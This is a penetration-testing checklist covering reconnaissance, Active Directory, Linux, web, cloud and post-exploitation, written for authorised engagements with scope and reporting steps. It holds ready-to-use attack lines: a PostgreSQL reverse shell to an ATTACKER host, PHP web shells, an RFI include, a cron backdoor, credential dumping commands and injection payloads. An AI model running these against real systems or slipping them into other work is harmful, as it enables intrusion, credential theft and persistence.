# COMPREHENSIVE PENETRATION TESTING CHECKLIST
# Organized by Attack Domain

## PRE-ENGAGEMENT CHECKLIST

### Administrative & Scoping
- [ ] Review Rules of Engagement (RoE) document
- [ ] Confirm IP ranges and domains in scope
- [ ] Identify out-of-scope systems explicitly
- [ ] Note any restricted actions (DoS, social engineering, etc.)
- [ ] Establish communication channels with client
- [ ] Set up secure evidence storage location
- [ ] Configure note-taking system (CherryTree, Obsidian, OneNote)
- [ ] Test VPN/VDI connectivity
- [ ] Verify toolkit installation and tool functionality
- [ ] Assign team roles and responsibilities
- [ ] Set up shared documentation platform (Google Docs, HackMD)
- [ ] Configure screenshot tool (flameshot, greenshot)
- [ ] Start timer/time tracking

---

## RECONNAISSANCE & ENUMERATION

### Network Discovery
- [ ] **Passive reconnaissance** 
  - [ ] DNS enumeration: `dig`, `nslookup`, `dnsrecon`, `fierce`
  - [ ] WHOIS lookups: `whois domain.com`
  - [ ] Google dorking: `site:target.com filetype:pdf`
  - [ ] Shodan/Censys: Search for exposed services
  - [ ] Certificate transparency logs: `crt.sh`
  - [ ] Subdomain enumeration: `subfinder`, `amass`, `assetfinder`
  - [ ] Email harvesting: `theHarvester`, `hunter.io`

- [ ] **Active network scanning**
  - [ ] Ping sweep: `nmap -sn NETWORK/24` or `fping -g NETWORK/24`
  - [ ] Fast port scan: `rustscan -a TARGET` or `masscan -p1-65535 TARGET`
  - [ ] Full TCP scan: `nmap -p- -T4 TARGET -oA full_scan`
  - [ ] Service version detection: `nmap -sV -sC -p PORTS TARGET`
  - [ ] UDP scan (top ports): `nmap -sU --top-ports 100 TARGET`
  - [ ] OS detection: `nmap -O TARGET`
  - [ ] Vulnerability scanning: `nmap --script vuln TARGET`
  - [ ] All-in-one: `AutoRecon TARGET` or use custom auto_recon.sh

- [ ] **Network mapping**
  - [ ] ARP scan: `arp-scan -l` or `netdiscover`
  - [ ] Route identification: `traceroute TARGET`
  - [ ] Document network topology

### Port & Service Analysis
- [ ] Analyze all open ports against port reference guide
- [ ] Prioritize high-value targets: DCs (88,389), DBs (1433,3306,5432), Web (80,443)
- [ ] Identify service versions for all critical services
- [ ] Check for default/known vulnerable versions
- [ ] Document all findings in target inventory spreadsheet

---

## WINDOWS / ACTIVE DIRECTORY TESTING

### Initial Enumeration (No Credentials)
- [ ] **Domain Controller identification**
  - [ ] Identify via Kerberos (88), LDAP (389), DNS (53)
  - [ ] Record all DC hostnames and IPs

- [ ] **SMB enumeration**
  - [ ] Check SMB signing: `crackmapexec smb TARGET --gen-relay-list`
  - [ ] Null session: `smbclient -L //TARGET -N`
  - [ ] Enum4linux: `enum4linux-ng TARGET -oA output`
  - [ ] SMB shares: `smbmap -H TARGET` or `smbclient -L //TARGET`
  - [ ] List shares: `crackmapexec smb TARGET -u '' -p '' --shares`

- [ ] **RPC enumeration**
  - [ ] RID cycling: `crackmapexec smb TARGET -u '' -p '' --rid-brute`
  - [ ] User enumeration: `rpcclient -U "" TARGET` then `enumdomusers`
  - [ ] Group enumeration: `rpcclient` then `enumdomgroups`

- [ ] **LDAP enumeration**
  - [ ] Anonymous LDAP: `ldapsearch -x -h TARGET -b "dc=domain,dc=local"`
  - [ ] Extract domain info: `ldapdomaindump TARGET -n`

- [ ] **Password policy check**
  - [ ] `netexec smb TARGET -u '' -p '' --pass-pol`
  - [ ] Note lockout threshold (critical for password spraying!)

- [ ] **DNS enumeration**
  - [ ] Zone transfer: `dig axfr @TARGET domain.local`
  - [ ] Enumerate records: `nslookup`, `dig`

### Credential-Based Attacks (No Auth Required)
- [ ] **AS-REP Roasting**
  - [ ] `impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat`
  - [ ] Crack hashes: `hashcat -m 18200 hashes.txt rockyou.txt`
  - [ ] Try with common usernames if no user list

- [ ] **LLMNR/NBT-NS Poisoning (Responder)**
  - [ ] `sudo responder -I eth0 -wv`
  - [ ] Let run for 30+ minutes
  - [ ] Check logs: `/usr/share/responder/logs/`
  - [ ] Crack captured hashes: `hashcat -m 5600 hash.txt rockyou.txt`

- [ ] **Password Spraying (CAREFUL!)**
  - [ ] Verify lockout policy first
  - [ ] Try 3-4 passwords maximum
  - [ ] Wait 30+ minutes between attempts
  - [ ] Common passwords: Welcome2024!, Fall2024!, Summer2024!
  - [ ] Tools: `kerbrute passwordspray`, `crackmapexec smb TARGET -u users.txt -p password`

### Authenticated Enumeration (Have Credentials)
- [ ] **Kerberoasting**
  - [ ] `impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request`
  - [ ] Crack: `hashcat -m 13100 hashes.txt rockyou.txt`
  - [ ] Check if service accounts are Domain Admins

- [ ] **BloodHound collection**
  - [ ] `bloodhound-python -u user -p pass -ns DC_IP -d DOMAIN -c All --zip`
  - [ ] Import into BloodHound GUI
  - [ ] Run pre-built queries: Shortest path to DA, Kerberoastable accounts
  - [ ] Identify attack paths

- [ ] **Share enumeration**
  - [ ] `crackmapexec smb NETWORK -u user -p pass --shares`
  - [ ] Spider shares: `crackmapexec smb TARGET -u user -p pass -M spider_plus`
  - [ ] Look for: passwords.txt, config files, scripts, backups

- [ ] **Domain enumeration with PowerView**
  - [ ] Get domain info: `Get-Domain`
  - [ ] Get domain controllers: `Get-DomainController`
  - [ ] Get users: `Get-DomainUser`
  - [ ] Get groups: `Get-DomainGroup`
  - [ ] Get computers: `Get-DomainComputer`

### Exploitation & Privilege Escalation
- [ ] **NTLM Relay Attacks (if SMB signing disabled)**
  - [ ] PetitPotam: `python3 PetitPotam.py ATTACKER_IP DC_IP`
  - [ ] DFSCoerce: `python3 DFSCoerce.py ATTACKER_IP DC_IP`
  - [ ] Relay to LDAPS: `impacket-ntlmrelayx -t ldaps://DC_IP`
  - [ ] Check if escalation successful

- [ ] **DCSync (if Domain Admin)**
  - [ ] `impacket-secretsdump DOMAIN/user:pass@DC_IP -just-dc`
  - [ ] Extract all hashes including krbtgt

- [ ] **Pass-the-Hash**
  - [ ] Test hash across network: `crackmapexec smb NETWORK -u user -H HASH`
  - [ ] Get shell: `evil-winrm -i TARGET -u user -H HASH`
  - [ ] `impacket-psexec DOMAIN/user@TARGET -hashes :HASH`

- [ ] **Kerberos attacks**
  - [ ] Unconstrained delegation: Check BloodHound
  - [ ] Constrained delegation: `Get-DomainComputer -TrustedToAuth`
  - [ ] Resource-based constrained delegation

- [ ] **GPO abuse**
  - [ ] Check for writable GPOs: `Get-DomainGPO | Get-DomainObjectAcl`
  - [ ] Modify GPO for persistence

### Windows Post-Exploitation
- [ ] **Credential dumping**
  - [ ] Mimikatz: `sekurlsa::logonpasswords`
  - [ ] SAM: `reg save HKLM\SAM sam.backup`
  - [ ] LSA Secrets: `reg save HKLM\SECURITY security.backup`
  - [ ] LSASS dump: `procdump -ma lsass.exe lsass.dmp`

- [ ] **Privilege escalation (if not admin)**
  - [ ] Token impersonation: PrintSpoofer, GodPotato
  - [ ] Check privileges: `whoami /priv`
  - [ ] Unquoted service paths: `wmic service get name,pathname`
  - [ ] AlwaysInstallElevated: Check registry
  - [ ] Scheduled tasks: `schtasks /query`

- [ ] **Lateral movement**
  - [ ] Pass-the-Hash across network
  - [ ] WMI: `impacket-wmiexec`
  - [ ] WinRM: `evil-winrm`
  - [ ] PSExec: `impacket-psexec`
  - [ ] RDP: `xfreerdp /u:user /pth:HASH /v:TARGET`

- [ ] **Data collection**
  - [ ] User files: Desktop, Documents, Downloads
  - [ ] Shares: SYSVOL, NETLOGON
  - [ ] Config files: web.config, database configs
  - [ ] Scripts and batch files

---

## LINUX TESTING

### Service Enumeration
- [ ] **SSH (22)**
  - [ ] Banner grab: `nc TARGET 22`
  - [ ] Check for password authentication
  - [ ] Test common credentials (SMALL lists only!)
  - [ ] Try SSH key authentication if keys found elsewhere

- [ ] **FTP (21)**
  - [ ] Anonymous login: `ftp TARGET` (user: anonymous)
  - [ ] Check for writable directories
  - [ ] Download interesting files

- [ ] **Telnet (23)**
  - [ ] Connect: `telnet TARGET`
  - [ ] Default credentials: admin/admin, root/root

- [ ] **SMTP (25)**
  - [ ] User enumeration: `smtp-user-enum -M VRFY -U users.txt -t TARGET`
  - [ ] Check for open relay

- [ ] **DNS (53)**
  - [ ] Zone transfer: `dig axfr @TARGET domain.com`
  - [ ] Subdomain brute force: `fierce -dns domain.com`

- [ ] **NFS (2049) - QUICK WIN!**
  - [ ] Check exports: `showmount -e TARGET`
  - [ ] Mount shares: `mount -t nfs TARGET:/share /mnt/nfs`
  - [ ] Look for SSH keys, credentials, sensitive data

- [ ] **Redis (6379) - QUICK WIN!**
  - [ ] Test no-auth: `redis-cli -h TARGET`
  - [ ] If accessible, exploit for SSH key injection
  - [ ] `CONFIG SET dir /root/.ssh/`

- [ ] **MySQL (3306)**
  - [ ] Default creds: `mysql -h TARGET -u root -p` (try: empty, root, password)
  - [ ] Enumerate databases: `SHOW DATABASES;`
  - [ ] Web shell: `SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';`

- [ ] **PostgreSQL (5432)**
  - [ ] Default creds: `psql -h TARGET -U postgres` (password: postgres)
  - [ ] RCE: `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';`

- [ ] **MongoDB (27017)**
  - [ ] No-auth: `mongo --host TARGET`
  - [ ] Enumerate: `show dbs`, `db.users.find()`

- [ ] **Elasticsearch (9200)**
  - [ ] Check access: `curl http://TARGET:9200/`
  - [ ] List indices: `curl http://TARGET:9200/_cat/indices`
  - [ ] Search for credentials: `curl http://TARGET:9200/_search?q=password`

- [ ] **Memcached (11211)**
  - [ ] Connect: `telnet TARGET 11211`
  - [ ] Dump keys: `stats items`, `stats cachedump 1 100`

### Linux Exploitation
- [ ] **Initial access attempts**
  - [ ] Exploit known CVEs for service versions
  - [ ] Default credentials on services
  - [ ] SSH key reuse from other systems
  - [ ] Web application vulnerabilities (see Web section)

- [ ] **Privilege escalation**
  - [ ] `sudo -l` - ALWAYS CHECK FIRST
  - [ ] SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
  - [ ] Docker group: `groups` (if docker, instant root)
  - [ ] Writable /etc/passwd: `ls -la /etc/passwd`
  - [ ] Cron jobs: `cat /etc/crontab`, check writable scripts
  - [ ] Capabilities: `getcap -r / 2>/dev/null`
  - [ ] Kernel exploits: `searchsploit linux kernel $(uname -r)`

- [ ] **Automated enumeration**
  - [ ] LinPEAS: `./linpeas.sh`
  - [ ] Linux Smart Enumeration: `./lse.sh`
  - [ ] LinEnum: `./LinEnum.sh`

### Linux Post-Exploitation
- [ ] **Credential harvesting**
  - [ ] `/etc/shadow` (if readable)
  - [ ] SSH keys: `find / -name id_rsa 2>/dev/null`
  - [ ] History files: `.bash_history`, `.mysql_history`
  - [ ] Config files: `grep -r "password" /etc/ /var/www/`
  - [ ] Environment variables: `env`

- [ ] **Persistence**
  - [ ] SSH keys: Add to `~/.ssh/authorized_keys`
  - [ ] Cron jobs: `(crontab -l; echo "@reboot /tmp/.backdoor") | crontab -`
  - [ ] Startup scripts: Modify `/etc/rc.local`

- [ ] **Data collection**
  - [ ] User files
  - [ ] Application configs
  - [ ] Database backups
  - [ ] Log files

---

## WEB APPLICATION TESTING

### Discovery & Reconnaissance
- [ ] **Technology identification**
  - [ ] `whatweb TARGET`
  - [ ] `httpx -l targets.txt -tech-detect`
  - [ ] Wappalyzer browser extension
  - [ ] Check headers: `curl -I TARGET`

- [ ] **Sensitive file discovery**
  - [ ] `.git/config` - `git-dumper http://TARGET/.git ./dump`
  - [ ] `.env`, `.env.local`, `.env.production`
  - [ ] `config.php`, `config.php.bak`, `database.yml`
  - [ ] `phpinfo.php`, `info.php`, `test.php`
  - [ ] `backup.zip`, `site.tar.gz`, `dump.sql`
  - [ ] `robots.txt`, `sitemap.xml`
  - [ ] `.DS_Store`, `web.config.bak`

- [ ] **Directory enumeration**
  - [ ] `gobuster dir -u TARGET -w wordlist.txt -x php,txt,html,bak`
  - [ ] `ffuf -u http://TARGET/FUZZ -w wordlist.txt`
  - [ ] `dirsearch -u TARGET -e php,asp,aspx,jsp,html,zip`
  - [ ] `feroxbuster -u TARGET -w wordlist.txt`

- [ ] **Content discovery**
  - [ ] Spider/crawl: `katana -u TARGET`
  - [ ] Burp Suite spider
  - [ ] `gospider -s TARGET`

- [ ] **Parameter fuzzing**
  - [ ] `ffuf -u "http://TARGET/page?FUZZ=test" -w parameters.txt`
  - [ ] `arjun -u TARGET`

- [ ] **Subdomain enumeration**
  - [ ] `subfinder -d domain.com`
  - [ ] `amass enum -d domain.com`
  - [ ] `gobuster vhost -u TARGET -w wordlist.txt`

- [ ] **Vulnerability scanning**
  - [ ] `nuclei -u TARGET -severity critical,high`
  - [ ] `nikto -h TARGET`
  - [ ] Burp Suite active scan (paid version)

### Manual Testing - Input Validation
- [ ] **SQL Injection**
  - [ ] Manual: `' OR '1'='1`, `' AND 1=2--`, `' UNION SELECT NULL--`
  - [ ] SQLMap: `sqlmap -u "http://TARGET/page?id=1" --batch`
  - [ ] Test GET, POST, Cookie, Headers
  - [ ] Error-based, Blind, Time-based detection
  - [ ] Exploit: `--os-shell`, `--file-read`, `--dbs`

- [ ] **Cross-Site Scripting (XSS)**
  - [ ] Reflected: `<script>alert(1)</script>`
  - [ ] Stored: Test in comments, profiles, forms
  - [ ] DOM-based: Check client-side JavaScript
  - [ ] `xsser -u "TARGET?param=XSS"`
  - [ ] `dalfox url TARGET`

- [ ] **Command Injection**
  - [ ] `; id`, `| id`, `` `id` ``, `$(id)`
  - [ ] Blind: `; sleep 10`, `| ping -c 10 ATTACKER`
  - [ ] Test in: ping utilities, file operations, system commands

- [ ] **File Upload**
  - [ ] Upload PHP shell: `<?php system($_GET['c']); ?>`
  - [ ] Bypass filters: double extension (.php.jpg), case manipulation (.PhP)
  - [ ] Null byte: `shell.php%00.jpg`
  - [ ] Magic bytes: Add GIF89a to PHP shell
  - [ ] Test execution: Access uploaded file

- [ ] **Local File Inclusion (LFI)**
  - [ ] `../../../../etc/passwd`
  - [ ] `../../../../windows/win.ini`
  - [ ] PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
  - [ ] Log poisoning: Inject PHP in User-Agent, include log file

- [ ] **Remote File Inclusion (RFI)**
  - [ ] `http://ATTACKER/shell.txt`
  - [ ] Host malicious file, include it

- [ ] **XML External Entity (XXE)**
  - [ ] `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
  - [ ] Test in XML inputs, SOAP APIs
  - [ ] Blind XXE via OOB

- [ ] **Server-Side Request Forgery (SSRF)**
  - [ ] `http://169.254.169.254/latest/meta-data/` (AWS)
  - [ ] `http://localhost:22`, `http://127.0.0.1:3306`
  - [ ] Scan internal network
  - [ ] Read internal files: `file:///etc/passwd`

- [ ] **Insecure Deserialization**
  - [ ] Identify serialized objects (Java, PHP, Python)
  - [ ] `ysoserial` for Java
  - [ ] `phpggc` for PHP

- [ ] **Server-Side Template Injection (SSTI)**
  - [ ] `{{7*7}}`, `<%= 7*7 %>`, `${7*7}`
  - [ ] Identify template engine
  - [ ] RCE payloads for specific engine

### Authentication & Session Management
- [ ] **Default credentials**
  - [ ] admin/admin, admin/password
  - [ ] Check vendor documentation
  - [ ] `cewl TARGET` to generate custom wordlist

- [ ] **Brute force (CAREFUL!)**
  - [ ] `hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"`
  - [ ] Check for account lockout first
  - [ ] Rate limiting bypass

- [ ] **Session management**
  - [ ] Check cookie security flags: HttpOnly, Secure, SameSite
  - [ ] Session fixation
  - [ ] Session timeout
  - [ ] Token predictability

- [ ] **Password reset**
  - [ ] Token predictability
  - [ ] Token not expiring
  - [ ] Account enumeration

- [ ] **2FA/MFA bypass**
  - [ ] Missing on critical functions
  - [ ] Response manipulation
  - [ ] Rate limiting on codes

### Authorization & Access Control
- [ ] **Insecure Direct Object References (IDOR)**
  - [ ] Modify IDs: `/user/123` → `/user/124`
  - [ ] GUIDs, hashes, encodings
  - [ ] Test in GET, POST, cookies

- [ ] **Path traversal**
  - [ ] `/../../etc/passwd`
  - [ ] In file parameters, downloads

- [ ] **Privilege escalation**
  - [ ] Horizontal: Access other users' data
  - [ ] Vertical: Access admin functions as user
  - [ ] Role manipulation in requests

- [ ] **Missing function-level access control**
  - [ ] Direct URL access to admin pages
  - [ ] API endpoints without authentication

### API Testing
- [ ] **API discovery**
  - [ ] Common paths: `/api/`, `/api/v1/`, `/rest/`, `/graphql`
  - [ ] Check documentation: `/swagger`, `/api-docs`

- [ ] **Authentication**
  - [ ] API keys in URLs, headers
  - [ ] JWT analysis: `jwt.io`, check algorithm, expiry
  - [ ] OAuth misconfigurations

- [ ] **Injection attacks**
  - [ ] SQL injection in API parameters
  - [ ] NoSQL injection: `{"$ne": null}`
  - [ ] Command injection in API calls

- [ ] **Mass assignment**
  - [ ] Add unexpected parameters: `"isAdmin": true`

- [ ] **Rate limiting**
  - [ ] Test for DoS potential
  - [ ] Brute force protection

- [ ] **Verbose errors**
  - [ ] Stack traces revealing paths
  - [ ] Database errors

### Client-Side Testing
- [ ] **JavaScript analysis**
  - [ ] Deobfuscate: `js-beautify`
  - [ ] Look for: API keys, endpoints, comments, credentials
  - [ ] Check source maps: `.js.map`

- [ ] **DOM-based vulnerabilities**
  - [ ] DOM XSS
  - [ ] Client-side prototype pollution

- [ ] **Postmessage vulnerabilities**
  - [ ] Insecure cross-origin communication

### CMS-Specific Testing
- [ ] **WordPress**
  - [ ] Version: Check meta tags, readme.html
  - [ ] User enumeration: `wpscan --url TARGET --enumerate u`
  - [ ] Plugin/theme vulnerabilities: `wpscan --url TARGET --enumerate vp,vt`
  - [ ] XML-RPC: `/xmlrpc.php`
  - [ ] wp-config.php backup

- [ ] **Joomla**
  - [ ] `joomscan -u TARGET`
  - [ ] Default admin: `/administrator`

- [ ] **Drupal**
  - [ ] `droopescan scan drupal -u TARGET`
  - [ ] Drupalgeddon vulnerabilities

### Web Server Testing
- [ ] **Apache**
  - [ ] .htaccess bypass
  - [ ] Server-status: `/server-status`
  - [ ] CVEs for version

- [ ] **IIS**
  - [ ] Short name disclosure: `~1`
  - [ ] web.config disclosure

- [ ] **Nginx**
  - [ ] Alias misconfiguration: path traversal
  - [ ] Config files

- [ ] **Tomcat**
  - [ ] Manager app: `/manager/html` (tomcat:tomcat)
  - [ ] Deploy WAR file for RCE

### Web Application Firewall (WAF) Testing
- [ ] **Identify WAF**
  - [ ] `wafw00f TARGET`
  - [ ] Check response headers

- [ ] **Bypass techniques**
  - [ ] Encoding: URL, Unicode, hex
  - [ ] Case manipulation
  - [ ] HTTP parameter pollution
  - [ ] Content-Type manipulation

---

## CLOUD ENVIRONMENT TESTING

### AWS Testing
- [ ] **Reconnaissance**
  - [ ] S3 bucket enumeration: `aws s3 ls s3://bucket-name --no-sign-request`
  - [ ] Check public buckets: `s3scanner`
  - [ ] Enumerate resources: `aws ec2 describe-instances`

- [ ] **Metadata service**
  - [ ] `curl http://169.254.169.254/latest/meta-data/`
  - [ ] `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - [ ] Extract credentials, assume role

- [ ] **IAM assessment**
  - [ ] `aws iam get-user`
  - [ ] `aws iam list-attached-user-policies`
  - [ ] Privilege escalation paths

- [ ] **S3 bucket testing**
  - [ ] Public read: `aws s3 ls s3://bucket --no-sign-request`
  - [ ] Public write: `aws s3 cp test.txt s3://bucket/test.txt --no-sign-request`
  - [ ] ACL misconfiguration

- [ ] **Automated scanning**
  - [ ] ScoutSuite: `scout aws`
  - [ ] Prowler: `./prowler -M html`
  - [ ] Pacu: AWS exploitation framework

### Azure Testing
- [ ] **Metadata service**
  - [ ] `curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01`
  - [ ] Extract access tokens

- [ ] **Storage account testing**
  - [ ] Anonymous blob access
  - [ ] SAS token abuse

- [ ] **Azure AD**
  - [ ] `az ad user list`
  - [ ] `az ad group list`
  - [ ] Password spray (carefully!)

- [ ] **Automated scanning**
  - [ ] ScoutSuite: `scout azure`
  - [ ] AzureHound: AD enumeration

### GCP Testing
- [ ] **Metadata service**
  - [ ] `curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"`

- [ ] **Storage buckets**
  - [ ] `gsutil ls gs://bucket-name`
  - [ ] Public access testing

- [ ] **Automated scanning**
  - [ ] ScoutSuite: `scout gcp`

---

## PASSWORD ATTACKS

### Hash Cracking
- [ ] **Hashcat**
  - [ ] Identify hash type: `hashcat --example-hashes | grep -B 1 -A 2 "hash"`
  - [ ] NTLM: `hashcat -m 1000 hashes.txt rockyou.txt`
  - [ ] NTLMv2: `hashcat -m 5600 hashes.txt rockyou.txt`
  - [ ] Kerberoast: `hashcat -m 13100 hashes.txt rockyou.txt`
  - [ ] AS-REP: `hashcat -m 18200 hashes.txt rockyou.txt`
  - [ ] Rules: `hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule`

- [ ] **John the Ripper**
  - [ ] Auto-detect: `john --wordlist=rockyou.txt hashes.txt`
  - [ ] Specific format: `john --format=NT hashes.txt`

- [ ] **Wordlists**
  - [ ] rockyou.txt
  - [ ] SecLists: `/usr/share/seclists/Passwords/`
  - [ ] CeWL: Generate custom wordlist from target site
  - [ ] CUPP: Create personalized wordlists

### Online Password Attacks
- [ ] SSH: `hydra -L users.txt -P passwords.txt ssh://TARGET`
- [ ] FTP: `hydra -L users.txt -P passwords.txt ftp://TARGET`
- [ ] HTTP: `hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"`
- [ ] RDP: `hydra -L users.txt -P passwords.txt rdp://TARGET`
- [ ] SMB: `crackmapexec smb TARGET -u users.txt -p passwords.txt`
- [ ] WinRM: `crackmapexec winrm TARGET -u users.txt -p passwords.txt`

---

## SOCIAL ENGINEERING

### Phishing
- [ ] `gophish` - Phishing framework
- [ ] `setoolkit` - Social Engineering Toolkit
- [ ] Email spoofing testing
- [ ] Credential harvesting pages

---

## POST-EXPLOITATION & PIVOTING

### Maintaining Access
- [ ] Web shells
- [ ] SSH keys
- [ ] Scheduled tasks/cron jobs
- [ ] Registry run keys (Windows)
- [ ] Backdoor accounts

### Pivoting & Tunneling
- [ ] **SSH Tunneling**
  - [ ] Local: `ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@jump_host`
  - [ ] Remote: `ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@target`
  - [ ] Dynamic (SOCKS): `ssh -D 1080 user@target`

- [ ] **Chisel**
  - [ ] Server: `chisel server --reverse --port 8080`
  - [ ] Client: `chisel client ATTACKER:8080 R:socks`
  - [ ] Use with proxychains

- [ ] **Metasploit**
  - [ ] `autoroute`
  - [ ] `socks_proxy`
  - [ ] Port forwarding

- [ ] **Proxychains**
  - [ ] Configure: `/etc/proxychains4.conf`
  - [ ] Use: `proxychains nmap -sT TARGET`

### Data Exfiltration
- [ ] HTTP POST
- [ ] DNS exfiltration
- [ ] ICMP tunneling
- [ ] Steganography
- [ ] Cloud storage (if accessible)

---

## EVIDENCE COLLECTION & DOCUMENTATION

### During Testing
- [ ] Screenshot every command and output
- [ ] Annotate screenshots (boxes, arrows, highlights)
- [ ] Save all command outputs to text files
- [ ] Record all credentials found (in secure location)
- [ ] Time stamp all activities
- [ ] Document what didn't work (shows thoroughness)

### Evidence Requirements
For each finding:
- [ ] Screenshot showing vulnerability exists
- [ ] Screenshot showing exploitation
- [ ] Screenshot showing impact/access
- [ ] Exact commands used
- [ ] System information (hostname, IP, OS)
- [ ] Timestamp
- [ ] Affected user/service

### Screenshot Standards
- [ ] Use flameshot/greenshot with consistent colors
- [ ] Include terminal prompt showing hostname
- [ ] Show full command and output
- [ ] Annotate key information
- [ ] Don't crop too much (show context)
- [ ] High resolution (readable text)

---

## REPORTING CHECKLIST

### Executive Summary
- [ ] High-level overview (non-technical)
- [ ] Key findings (3-5 most critical)
- [ ] Business impact
- [ ] Overall risk rating
- [ ] Immediate actions required

### Technical Findings
For each finding:
- [ ] Finding ID (F-001, F-002, etc.)
- [ ] Descriptive title
- [ ] Severity (Critical/High/Medium/Low)
- [ ] CVSS score
- [ ] Affected systems (specific hostnames/IPs)
- [ ] Description (what's wrong)
- [ ] Business impact (why it matters)
- [ ] Evidence (screenshots)
- [ ] Reproduction steps (exact commands)
- [ ] Remediation (specific steps to fix)
- [ ] References (CVE, advisories, links)

### Report Quality
- [ ] Spell check (entire document)
- [ ] Grammar check
- [ ] Consistent formatting
- [ ] Table of contents
- [ ] Page numbers
- [ ] Professional appearance
- [ ] All credentials redacted
- [ ] All screenshots referenced in text
- [ ] No "TBD" or placeholders
- [ ] Client name correct throughout
- [ ] Date and version number

### Appendices
- [ ] Methodology
- [ ] Tools used (with versions)
- [ ] Complete asset inventory
- [ ] Wordlists used
- [ ] Testing timeline
- [ ] Team roster

---

## ESSENTIAL TOOL LIST

### Reconnaissance
- nmap, rustscan, masscan
- subfinder, amass, assetfinder
- dig, nslookup, fierce, dnsrecon
- theHarvester
- whois
- Shodan, Censys

### Enumeration
- enum4linux-ng
- smbclient, smbmap
- rpcclient
- ldapsearch, ldapdomaindump
- snmpwalk

### Web
- Burp Suite Professional
- gobuster, ffuf, dirsearch, feroxbuster
- sqlmap
- nuclei
- nikto
- httpx
- katana, gospider
- whatweb, wappalyzer

### Exploitation
- Metasploit Framework
- searchsploit (exploitdb)
- msfvenom
- socat, ncat

### Windows/AD
- CrackMapExec (netexec)
- Impacket suite (psexec, secretsdump, GetUserSPNs, GetNPUsers, ntlmrelayx)
- evil-winrm
- Mimikatz
- BloodHound + SharpHound
- Responder
- kerbrute
- PowerView, PowerSploit
- Rubeus
- PetitPotam, DFSCoerce

### Linux
- LinPEAS, LinEnum
- GTFOBins reference
- pspy
- linux-smart-enumeration

### Password Attacks
- hashcat
- john (john the ripper)
- hydra
- medusa
- hashid

### Pivoting
- chisel
- proxychains
- ligolo-ng

### Utilities
- tmux, screen
- jq (JSON parsing)
- base64
- xxd, hexdump
- python3, ruby, perl
- curl, wget
- nc (netcat)
- awk, sed, grep

---

## CRITICAL REMINDERS

### Safety & Scope
- [ ] Stay within defined scope
- [ ] Respect lockout thresholds
- [ ] No destructive actions
- [ ] No DoS/flooding
- [ ] Communicate issues to client immediately
- [ ] Stop testing if you break something

### Professional Conduct
- [ ] Maintain communication with client
- [ ] Document thoroughly
- [ ] Report findings as you discover them
- [ ] Ask for clarification if scope unclear
- [ ] Be respectful and professional
- [ ] Protect confidentiality

---

## QUICK WIN PRIORITIES

Always try these first:
1. Default credentials on everything
2. Redis with no auth → root SSH
3. NFS exports → SSH keys
4. AS-REP roasting → valid creds
5. Exposed .git/.env files
6. Anonymous FTP
7. Null session SMB
8. Unauthenticated database access

---